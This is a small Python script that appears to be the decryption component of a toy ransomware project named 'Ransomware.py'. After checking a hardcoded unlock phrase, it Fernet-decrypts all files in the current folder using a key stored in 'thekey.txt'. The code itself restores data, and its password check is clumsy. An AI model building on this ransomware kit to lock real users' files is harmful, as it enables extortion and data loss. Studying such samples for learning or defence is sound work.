#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet




def check_secret_phrase(user_phrase, secret_phrase):

    with open("thekey.txt", "rb") as file_with_key:
        key = file_with_key.read()

    files = []
    length = len(user_phrase)
    a = 0
    for character in range(length):
        if secret_phrase[a] == user_phrase[a] and secret_phrase == user_phrase:
            a += 1
        else:
            print("Wrong answer")
            exit()
        if a == 7:
            break
    print("Password was correct")

    for file in os.listdir():
        # Lists directories and if target in directory is a file, append to list
        if file == "Ransomware.py" or file == "thekey.txt" or file == "Decrypt_Ransomware.py.swp" or file == "Decrypt_Ransomware.py":
            continue
        if os.path.isfile(file):
            files.append(file)

    for file in files:
        with open(file, "rb") as attacked_file:
            contents = attacked_file.read().strip()
            contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as attacked_file:
            attacked_file.write(contents_decrypted)
        print(f"\nDecrypted filename: {file}")




if __name__ == "__main__":
    secret_phrase = "Elliot27"

    user_phrase = input("please enter decryption code: ")
    check_secret_phrase(user_phrase, secret_phrase)